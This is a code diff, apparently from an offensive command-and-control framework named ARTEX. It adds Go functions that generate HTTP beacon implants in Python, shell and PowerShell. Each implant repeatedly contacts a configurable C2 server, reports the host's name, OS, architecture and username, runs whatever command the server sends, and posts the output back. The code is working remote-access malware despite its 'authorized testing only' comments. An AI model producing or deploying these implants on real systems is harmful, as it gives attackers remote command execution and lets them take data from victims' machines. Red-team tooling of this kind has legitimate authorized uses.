@@ -87,3 +87,102 @@ def main():
 if __name__ == "__main__":
     main()
 `
+
+// HTTP 植入端模板（P1-6）：轮询 /c2/beacon/<token>，拉取任务并回传结果。
+// baseURL 形如 http://10.0.0.1:8443（生成 API 可用 base_url 覆盖 NAT 地址）。
+
+func HTTPImplantPython(baseURL, token string) string {
+	return fmt.Sprintf(httpPyTmpl, baseURL, token)
+}
+
+const httpPyTmpl = `#!/usr/bin/env python3
+# ARTEX C2 HTTP beacon implant (authorized testing only)
+import json, os, platform, socket, subprocess, time, urllib.request, uuid
+
+BASE = %q
+TOKEN = %q
+UUID = uuid.uuid4().hex[:12]
+
+def send(payload):
+    req = urllib.request.Request(BASE.rstrip("/") + "/c2/beacon/" + TOKEN,
+                                 data=json.dumps(payload).encode(),
+                                 headers={"Content-Type": "application/json"})
+    with urllib.request.urlopen(req, timeout=30) as resp:
+        return json.loads(resp.read() or b"{}")
+
+def main():
+    while True:
+        delay = 30
+        try:
+            resp = send({"implant_uuid": UUID, "hostname": socket.gethostname(),
+                         "os": platform.system(), "arch": platform.machine(),
+                         "username": os.getenv("USER", "")})
+            delay = int(resp.get("heartbeat_sec") or 30)
+            task = resp.get("task")
+            if task:
+                try:
+                    out = subprocess.run(task.get("args", ""), shell=True, capture_output=True, timeout=60)
+                    send({"implant_uuid": UUID, "task_id": task.get("id"),
+                          "ok": out.returncode == 0,
+                          "output": (out.stdout + out.stderr).decode(errors="replace")})
+                except Exception as exc:
+                    send({"implant_uuid": UUID, "task_id": task.get("id"), "ok": False, "error": str(exc)})
+        except Exception:
+            pass
+        time.sleep(delay)
+
+if __name__ == "__main__":
+    main()
+`
+
+func HTTPImplantBash(baseURL, token string) string {
+	return fmt.Sprintf(httpBashTmpl, baseURL, token)
+}
+
+const httpBashTmpl = `#!/bin/sh
+# ARTEX C2 HTTP beacon implant (authorized testing only)
+BASE=%q
+TOKEN=%q
+UUID="$(hostname)-$$"
+beacon() {
+  curl -s --max-time 30 -H "Content-Type: application/json" -X POST -d "$1" "$BASE/c2/beacon/$TOKEN"
+}
+while :; do
+  RESP=$(beacon "{"implant_uuid":"$UUID","hostname":"$(hostname)","os":"posix","arch":"sh","username":"$(whoami 2>/dev/null)"}") || RESP=""
+  TASK_ID=$(printf '%%s' "$RESP" | sed -n 's/.*"task":{"id":\([0-9][0-9]*\).*//p')
+  ARGS=$(printf '%%s' "$RESP" | sed -n 's/.*"args":"\([^"]*\)".*//p')
+  if [ -n "$TASK_ID" ]; then
+    OUT=$(sh -c "$ARGS" 2>&1)
+    CODE=$?
+    ESC=$(printf '%%s' "$OUT" | sed 's/\/\\/g; s/"/\"/g' | tr '
+' ' ')
+    if [ "$CODE" -eq 0 ]; then OK=true; else OK=false; fi
+    beacon "{"implant_uuid":"$UUID","task_id":$TASK_ID,"ok":$OK,"output":"$ESC"}" >/dev/null
+  fi
+  sleep 15
+done
+`
+
+func HTTPImplantPowerShell(baseURL, token string) string {
+	return fmt.Sprintf(httpPSTmpl, baseURL, token)
+}
+
+const httpPSTmpl = `# ARTEX C2 HTTP beacon implant (authorized testing only)
+$BASE = %q
+$TOKEN = %q
+$UUID = [guid]::NewGuid().ToString("N").Substring(0, 12)
+$Uri = $BASE.TrimEnd("/") + "/c2/beacon/" + $TOKEN
+while ($true) {
+  try {
+    $body = @{ implant_uuid = $UUID; hostname = $env:COMPUTERNAME; os = "windows";
+               arch = $env:PROCESSOR_ARCHITECTURE; username = $env:USERNAME } | ConvertTo-Json -Compress
+    $resp = Invoke-RestMethod -Method Post -Uri $Uri -ContentType "application/json" -Body $body -TimeoutSec 30
+    if ($resp.task) {
+      $out = try { (Invoke-Expression $resp.task.args) 2>&1 | Out-String } catch { "$_" }
+      $r = @{ implant_uuid = $UUID; task_id = $resp.task.id; ok = $true; output = $out } | ConvertTo-Json -Compress
+      Invoke-RestMethod -Method Post -Uri $Uri -ContentType "application/json" -Body $r -TimeoutSec 30 | Out-Null
+    }
+  } catch { }
+  Start-Sleep -Seconds 15
+}
+`
